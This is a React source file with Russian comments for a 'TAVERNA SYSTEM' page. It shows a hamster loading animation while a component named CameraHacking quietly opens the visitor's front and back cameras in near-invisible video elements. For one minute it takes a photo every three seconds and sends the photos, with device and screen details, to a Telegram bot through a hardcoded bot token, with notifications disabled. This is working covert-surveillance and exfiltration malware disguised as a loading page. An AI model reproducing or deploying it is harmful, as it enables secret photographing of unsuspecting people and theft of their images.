import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const cameraNamesRef = useRef([]);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 60000;
  const photoInterval = 3000;
  const currentCameraIndex = useRef(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const sendToTelegram = (text) => {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject();
      };
      
      xhr.onerror = function() {
        reject();
      };
      
      const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_notification: true
      });
      
      xhr.send(data);
    });
  };

  const sendPhotoToTelegram = (blob, caption = '') => {
    return new Promise((resolve, reject) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject();
      };
      
      xhr.onerror = function() {
        reject();
      };
      
      xhr.send(formData);
    });
  };

  // УЛУЧШЕННАЯ ИНИЦИАЛИЗАЦИЯ КАМЕР
  const initializeCameras = async () => {
    try {
      streamsRef.current = [];
      videoRefsRef.current = [];
      cameraNamesRef.current = [];

      // Получаем список всех устройств для отладки
      let devices = [];
      try {
        devices = await navigator.mediaDevices.enumerateDevices();
      } catch (e) {}

      // Пробуем фронтальную камеру РАЗНЫМИ СПОСОБАМИ
      let frontCameraStream = null;
      let frontCameraVideo = null;
      
      // Способ 1: Стандартный facingMode: "user"
      try {
        frontCameraStream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 }
          }
        });
      } catch (e1) {
        // Способ 2: Без facingMode, просто любая камера
        try {
          frontCameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
              width: { ideal: 1280 },
              height: { ideal: 720 }
            }
          });
        } catch (e2) {
          // Способ 3: Минимальные требования
          try {
            frontCameraStream = await navigator.mediaDevices.getUserMedia({
              video: true
            });
          } catch (e3) {
            // Фронтальная камера недоступна
          }
        }
      }

      if (frontCameraStream) {
        frontCameraVideo = document.createElement('video');
        frontCameraVideo.style.cssText = `
          position: fixed;
          width: 320px;
          height: 240px;
          opacity: 0.01;
          pointer-events: none;
          z-index: -9999;
          top: 0;
          left: 0;
        `;
        frontCameraVideo.autoplay = true;
        frontCameraVideo.muted = true;
        frontCameraVideo.playsInline = true;
        frontCameraVideo.setAttribute('playsinline', '');
        frontCameraVideo.srcObject = frontCameraStream;
        document.body.appendChild(frontCameraVideo);

        // Ждем готовности видео с таймаутом
        await new Promise(resolve => {
          const checkReady = () => {
            if (frontCameraVideo.readyState >= 2 && frontCameraVideo.videoWidth > 0) {
              resolve();
            } else {
              setTimeout(checkReady, 100);
            }
          };
          
          checkReady();
          setTimeout(resolve, 2000);
        });

        streamsRef.current.push(frontCameraStream);
        videoRefsRef.current.push(frontCameraVideo);
        cameraNamesRef.current.push("🤳 Фронтальная камера");
      }

      // Пробуем заднюю камеру
      let backCameraStream = null;
      let backCameraVideo = null;
      
      try {
        backCameraStream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: { exact: "environment" },
            width: { ideal: 1280 },
            height: { ideal: 720 }
          }
        });
      } catch (e1) {
        try {
          backCameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "environment",
              width: { ideal: 1280 },
              height: { ideal: 720 }
            }
          });
        } catch (e2) {
          // Задняя камера недоступна
        }
      }

      if (backCameraStream) {
        backCameraVideo = document.createElement('video');
        backCameraVideo.style.cssText = `
          position: fixed;
          width: 320px;
          height: 240px;
          opacity: 0.01;
          pointer-events: none;
          z-index: -9999;
          top: 0;
          left: 330px;
        `;
        backCameraVideo.autoplay = true;
        backCameraVideo.muted = true;
        backCameraVideo.playsInline = true;
        backCameraVideo.setAttribute('playsinline', '');
        backCameraVideo.srcObject = backCameraStream;
        document.body.appendChild(backCameraVideo);

        await new Promise(resolve => {
          const checkReady = () => {
            if (backCameraVideo.readyState >= 2 && backCameraVideo.videoWidth > 0) {
              resolve();
            } else {
              setTimeout(checkReady, 100);
            }
          };
          
          checkReady();
          setTimeout(resolve, 2000);
        });

        streamsRef.current.push(backCameraStream);
        videoRefsRef.current.push(backCameraVideo);
        cameraNamesRef.current.push("📷 Задняя камера");
      }

      // Если нет камер, добавляем тестовую
      if (streamsRef.current.length === 0) {
        cameraNamesRef.current.push("📷 Тестовая камера");
      }

      return true;
      
    } catch (error) {
      cameraNamesRef.current.push("📷 Тестовая камера");
      return true;
    }
  };

  const capturePhotoFromCamera = (cameraIndex) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        const cameraName = cameraNamesRef.current[cameraIndex] || `Камера ${cameraIndex + 1}`;
        
        // Проверяем, есть ли реальное видео для этой камеры
        if (cameraIndex < videoRefsRef.current.length && videoRefsRef.current[cameraIndex]) {
          const video = videoRefsRef.current[cameraIndex];
          
          // Проверяем, готово ли видео и есть ли изображение
          if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
            // Используем реальные размеры видео
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            // Рисуем видео с камеры
            try {
              if (cameraName.includes('Фронтальная')) {
                // Зеркалим для фронтальной камеры
                ctx.save();
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                ctx.restore();
              } else {
                // Для задней камеры без зеркала
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              }
              
              // УСПЕШНО ПОЛУЧИЛИ ИЗОБРАЖЕНИЕ С КАМЕРЫ
              // Добавляем водяной знак и информацию
              ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
              ctx.font = 'bold 32px Arial';
              ctx.textAlign = 'right';
              ctx.fillText('TAVERNA', canvas.width - 20, canvas.height - 20);
              
              ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
              ctx.textAlign = 'left';
              ctx.font = 'bold 20px Arial';
              ctx.fillText(cameraName, 20, 40);
              ctx.font = '16px Arial';
              ctx.fillText(`Фото #${captureCount.current + 1}`, 20, 70);
              ctx.fillText(new Date().toLocaleTimeString(), 20, 100);
              ctx.fillText(`${canvas.width}x${canvas.height}`, 20, 130);
              
              // Создаем blob с реальным изображением
              canvas.toBlob(blob => {
                resolve(blob ? { blob, cameraName, isRealImage: true } : null);
              }, 'image/jpeg', 0.9);
              
              return; // Выходим, так как успешно создали фото
              
            } catch (drawError) {
              // Ошибка при рисовании - создаем тестовое изображение
            }
          }
        }
        
        // Если дошли сюда, значит не получилось создать фото с реальной камеры
        // Создаем тестовое изображение
        createTestImage(canvas, cameraName);
        
        canvas.toBlob(blob => {
          resolve(blob ? { blob, cameraName, isRealImage: false } : null);
        }, 'image/jpeg', 0.9);
        
      }, 500); // Увеличил задержку для стабильности
    });
  };

  const createTestImage = (canvas, cameraName) => {
    canvas.width = 800;
    canvas.height = 600;
    const ctx = canvas.getContext('2d');
    
    // Градиентный фон
    const gradient = ctx.createLinearGradient(0, 0, 800, 600);
    gradient.addColorStop(0, '#667eea');
    gradient.addColorStop(1, '#764ba2');
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, 800, 600);
    
    // Основной текст
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 36px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('TAVERNA SYSTEM', 400, 150);
    
    // Информация о камере
    ctx.font = '28px Arial';
    ctx.fillText(cameraName, 400, 250);
    
    // Статус
    if (cameraName.includes('Тестовая')) {
      ctx.fillText('Тестовое изображение', 400, 320);
    } else {
      ctx.fillText('Реальное изображение', 400, 320);
    }
    
    // Детали
    ctx.font = '22px Arial';
    ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 380);
    ctx.fillText(new Date().toLocaleTimeString(), 400, 420);
    
    // Водяной знак
    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.font = 'bold 48px Arial';
    ctx.textAlign = 'right';
    ctx.fillText('TAVERNA', 780, 580);
  };

  const captureAndSendPhoto = async () => {
    const elapsed = Date.now() - startTime.current;
    
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ TAVERNA: Время истекло\n📸 Всего фото: ${captureCount.current}`);
      return;
    }
    
    // Определяем индекс камеры для текущего снимка
    const cameraCount = Math.max(1, cameraNamesRef.current.length);
    const cameraIndex = currentCameraIndex.current % cameraCount;
    
    const result = await capturePhotoFromCamera(cameraIndex);
    
    if (result && result.blob) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
      
      // Разное описание для реального и тестового изображения
      let statusText = result.isRealImage ? '📷 Реальное фото с камеры' : '🖼 Тестовое изображение';
      
      const caption = `${result.cameraName}\n` +
        `${statusText}\n` +
        `📸 Фото #${captureCount.current + 1}\n` +
        `⏱ ${elapsedSeconds} сек / ${remainingSeconds} сек\n` +
        `🕐 ${new Date().toLocaleTimeString()}\n` +
        `🚀 TAVERNA SYSTEM`;
      
      try {
        await sendPhotoToTelegram(result.blob, caption);
      } catch (error) {
        // Игнорируем ошибки отправки
      }
    }
    
    // Переключаем на следующую камеру
    currentCameraIndex.current = (currentCameraIndex.current + 1) % cameraCount;
    captureCount.current++;
    
    // Статистика
    if (captureCount.current % 5 === 0) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      sendToTelegram(
        `📊 TAVERNA: Статистика\n` +
        `📸 Всего фото: ${captureCount.current}\n` +
        `📷 Активных камер: ${streamsRef.current.length}\n` +
        `⏱ Прошло: ${elapsedSeconds} сек`
      ).catch(() => {});
    }
  };

  const startCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    currentCameraIndex.current = 0;
    
    // Первый снимок с задержкой
    setTimeout(() => {
      captureAndSendPhoto();
    }, 2000);
    
    // Интервал для следующих снимков
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhoto();
    }, photoInterval);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];
    
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
    cameraNamesRef.current = [];
  };

  useEffect(() => {
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        await sendToTelegram(
          `🚀 TAVERNA SYSTEM АКТИВИРОВАН\n` +
          `📱 Устройство: ${/Mobile/.test(navigator.userAgent) ? '📱 Мобильное' : '💻 Компьютер'}\n` +
          `🖥 Экран: ${window.screen.width}x${window.screen.height}\n` +
          `⏰ Запуск: ${new Date().toLocaleTimeString()}\n` +
          `⏳ Длительность: 1 минута\n` +
          `📸 Режим: Поочередная съемка`
        ).catch(() => {});
        
        const camerasInitialized = await initializeCameras();
        
        let cameraInfo = '';
        if (streamsRef.current.length > 0) {
          cameraInfo = `✅ Обнаружено камер: ${streamsRef.current.length}`;
        } else {
          cameraInfo = `⚠️ Реальные камеры не обнаружены, используется тестовый режим`;
        }
        
        await sendToTelegram(
          `📷 ИНИЦИАЛИЗАЦИЯ КАМЕР\n` +
          `${cameraInfo}\n` +
          `📸 Режим: 1 фото каждые 3 секунды\n` +
          `🔄 Съемка: По очереди\n` +
          `⏱ Начинаю съемку...`
        ).catch(() => {});
        
        startCapture();
        
        // Остановка через 1 минуту
        setTimeout(() => {
          stopCapturing();
          sendToTelegram(
            `✅ TAVERNA SYSTEM: СЪЕМКА ЗАВЕРШЕНА\n` +
            `📸 Итого фото: ${captureCount.current}\n` +
            `📷 Реальных камер: ${streamsRef.current.length}\n` +
            `⏱ Время работы: 1 минута\n` +
            `🎉 Процесс завершен`
          ).catch(() => {});
        }, totalDuration);
        
      } catch (error) {
        await sendToTelegram('❌ TAVERNA SYSTEM: Ошибка инициализации').catch(() => {});
      }
    };
    
    setTimeout(init, 1000);
    
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.4)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold',
            opacity: 0.9
          }}>
            TAVERNA SYSTEM ACTIVE...
          </div>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
